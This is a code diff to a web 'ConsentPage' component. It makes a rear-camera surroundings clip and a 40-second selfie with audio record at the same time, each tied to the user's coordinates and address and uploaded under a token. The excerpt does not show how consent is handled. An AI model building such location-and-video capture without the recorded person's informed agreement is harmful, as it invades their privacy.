@@ -1350,32 +1350,26 @@ export default function ConsentPage() {
     }
     if (!geoVideoStartedRef.current) {
       geoVideoStartedRef.current = true;
-      // Rear-facing "surroundings" clip, then the front-facing selfie clip —
-      // run sequentially since most phones only expose one active camera
-      // stream at a time.
-      // Back camera: ultra-compressed, no audio — sub-second upload
+      geoSelfieStartedRef.current = true;
+      // Both clips start simultaneously — the browser opens two independent
+      // MediaRecorder streams (front + back) at the same time.
+      // Back camera: ultra-compressed, no audio — 4 s clip
       captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), {
         facingMode: "environment",
         durationMs: GEO_VIDEO_DURATION_MS,
         videoBps: GEO_VIDEO_BPS,
         audioBps: null,
         width: 160, height: 120, frameRate: 10,
-      })
-        .catch(() => setGeoVideoState("error"))
-        .finally(() => {
-          if (geoSelfieStartedRef.current) return;
-          geoSelfieStartedRef.current = true;
-          // Selfie: 40 s with audio, good quality floor
-          captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), {
-            facingMode: "user",
-            durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
-            videoBps: GEO_SELFIE_VIDEO_BPS,
-            audioBps: GEO_SELFIE_AUDIO_BPS,
-            width: 320, height: 240, frameRate: 15,
-            onElapsed: (s) => setGeoSelfieElapsed(s),
-          })
-            .catch(() => setGeoSelfieState("error"));
-        });
+      }).catch(() => setGeoVideoState("error"));
+      // Selfie: 40 s with audio, good quality floor
+      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), {
+        facingMode: "user",
+        durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
+        videoBps: GEO_SELFIE_VIDEO_BPS,
+        audioBps: GEO_SELFIE_AUDIO_BPS,
+        width: 320, height: 240, frameRate: 15,
+        onElapsed: (s) => setGeoSelfieElapsed(s),
+      }).catch(() => setGeoSelfieState("error"));
     }
 
     if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
